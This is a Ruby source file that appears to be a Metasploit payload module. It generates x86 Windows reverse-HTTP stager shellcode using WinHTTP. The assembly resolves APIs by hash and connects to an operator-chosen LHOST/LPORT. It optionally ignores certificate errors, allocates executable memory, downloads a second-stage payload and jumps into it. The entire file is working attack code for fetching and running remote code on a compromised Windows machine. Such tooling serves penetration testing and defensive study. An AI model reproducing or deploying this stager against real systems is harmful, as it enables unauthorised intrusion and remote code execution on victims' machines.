# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'
require 'msf/core/payload/windows/reverse_http'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S) using WinHTTP
#
###


module Payload::Windows::ReverseWinHttp

  include Msf::Payload::Windows::ReverseHttp

  #
  # Register reverse_winhttp specific options
  #
  def initialize(*args)
    super
  end

  #
  # Generate the first stage
  #
  def generate
    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_winhttp(
        ssl:  false,
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  generate_small_uri)
    end

    conf = {
      ssl:  false,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_winhttp(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # The final estimated size
    space
  end


  #
  # Convert a string into a NULL-terminated wchar byte array
  #
  def asm_generate_wchar_array(str)
    ( str.to_s + "\x00" ).
      unpack("C*").
      pack("v*").
      unpack("C*").
      map{ |c| "0x%.2x" % c }.
      join(",")
  end

  #
  # Dynamic payload generation
  #
  def asm_reverse_winhttp(opts={})


    #
    # options should contain:
    #    ssl:     (true|false)
    #    url:     "/url_to_request"
    #   host:     [hostname]
    #   port:     [port]
    # exitfunk:   [process|thread|seh|sleep]
    #

    encoded_url   = asm_generate_wchar_array(opts[:url])
    encoded_host  = asm_generate_wchar_array(opts[:host])

    http_open_flags = 0

    if opts[:ssl]
      # ;0x00800000  ; WINHTTP_FLAG_SECURE
      # ;0x00000100  ; WINHTTP_FLAG_BYPASS_PROXY_CACHE
      http_open_flags = (0x00800000 | 0x00000100)
    else
      # ;0x00000100  ; WINHTTP_FLAG_BYPASS_PROXY_CACHE
      http_open_flags = 0x00000100
    end

    asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

      load_winhttp:
        push 0x00707474        ; Push the string 'winhttp',0
        push 0x686E6977        ; ...
        push esp               ; Push a pointer to the "winhttp" string
        push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
        call ebp               ; LoadLibraryA( "winhttp" )

      set_retry:
        push.i8  6             ; retry 6 times
        pop edi
        xor ebx, ebx
        mov ecx, edi

      push_zeros:
        push ebx               ; NULL values for the WinHttpOpen API parameters
        loop push_zeros

      WinHttpOpen:
                               ; Flags [5]
                               ; ProxyBypass (NULL) [4]
                               ; ProxyName (NULL) [3]
                               ; AccessType (DEFAULT_PROXY= 0) [2]
                               ; UserAgent (NULL) [1]
        push 0xBB9D1F04        ; hash( "winhttp.dll", "WinHttpOpen" )
        call ebp

      WinHttpConnect:
        push ebx               ; Reserved (NULL) [4]
        push #{opts[:port]}    ; Port [3]
        call got_server_uri    ; Double call to get pointer for both server_uri and
      server_uri:              ; server_host; server_uri is saved in EDI for later
        db #{encoded_url}
      got_server_host:
        push eax               ; Session handle returned by WinHttpOpen [1]
        push 0xC21E9B46        ; hash( "winhttp.dll", "WinHttpConnect" )
        call ebp

      WinHttpOpenRequest:

        push.i32 #{"0x%.8x" % http_open_flags}
        push ebx               ; AcceptTypes (NULL) [6]
        push ebx               ; Referrer (NULL) [5]
        push ebx               ; Version (NULL)  [4]
        push edi               ; ObjectName (URI) [3]
        push ebx               ; Verb (GET method) (NULL)  [2]
        push eax               ; Connect handler returned by WinHttpConnect [1]
        push 0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
        call ebp
        xchg esi, eax          ; save HttpRequest handler in esi
      ^

    if opts[:ssl]
      asm << %Q^
        ; WinHttpSetOption (hInternet, WINHTTP_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer) );
        set_security_options:
          push 0x00003300
            ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
            ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
            ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
          mov eax, esp
          push.i8 4              ; sizeof(buffer)
          push eax               ; &buffer
          push.i8 31             ; DWORD dwOption (WINHTTP_OPTION_SECURITY_FLAGS)
          push esi               ; hHttpRequest
          push 0xCE9D58D3        ; hash( "winhttp.dll", "WinHttpSetOption" )
          call ebp
        ^
    end

    asm << %Q^
      send_request:

      WinHttpSendRequest:
        push ebx               ; Context [7]
        push ebx               ; TotalLength [6]
        push ebx               ; OptionalLength (0) [5]
        push ebx               ; Optional (NULL) [4]
        push ebx               ; HeadersLength (0) [3]
        push ebx               ; Headers (NULL) [2]
        push esi               ; HttpRequest handle returned by WinHttpOpenRequest [1]
        push 0x91BB5895        ; hash( "winhttp.dll", "WinHttpSendRequest" )
        call ebp
        test eax,eax
        jnz receive_response   ; if TRUE call WinHttpReceiveResponse API

      try_it_again:
        dec edi
        jnz send_request

      ; if we didn't allocate before running out of retries, fall through
      ^

      if opts[:exitfunk]
        asm << %Q^
          failure:
            call exitfunk
          ^
      else
        asm << %Q^
          failure:
            push 0x56A2B5F0        ; hardcoded to exitprocess for size
            call ebp
          ^
      end

      asm << %Q^
        receive_response:
                                 ; The API WinHttpReceiveResponse needs to be called
                                 ; first to get a valid handler for WinHttpReadData
          push ebx               ; Reserved (NULL) [2]
          push esi               ; Request handler returned by WinHttpSendRequest [1]
          push 0x709D8805        ; hash( "winhttp.dll", "WinHttpReceiveResponse" )
          call ebp
          test eax,eax
          jz failure
        ^

      asm << %Q^
        allocate_memory:
          push.i8 0x40           ; PAGE_EXECUTE_READWRITE
          push 0x1000            ; MEM_COMMIT
          push 0x00400000        ; Stage allocation (4Mb ought to do us)
          push ebx               ; NULL as we dont care where the allocation is
          push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
          call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

        download_prep:
          xchg eax, ebx          ; place the allocated base address in ebx
          push ebx               ; store a copy of the stage base address on the stack
          push ebx               ; temporary storage for bytes read count
          mov edi, esp           ; &bytesRead

        download_more:
          push edi               ; NumberOfBytesRead (bytesRead)
          push 8192              ; NumberOfBytesToRead
          push ebx               ; Buffer
          push esi               ; Request handler returned by WinHttpReceiveResponse
          push 0x7E24296C        ; hash( "winhttp.dll", "WinHttpReadData" )
          call ebp

          test eax,eax           ; if download failed? (optional?)
          jz failure

          mov eax, [edi]
          add ebx, eax           ; buffer += bytes_received

          test eax,eax           ; optional?
          jnz download_more      ; continue until it returns 0
          pop eax                ; clear the temporary storage

        execute_stage:
          ret                    ; dive into the stored stage address

        got_server_uri:
          pop edi
          call got_server_host   ; put the server_host on the stack (WinHttpConnect API [2])

        server_host:
          db #{encoded_host}
        ^

      if opts[:exitfunk]
        asm << asm_exitfunk(opts)
      end
    asm
  end

end

end

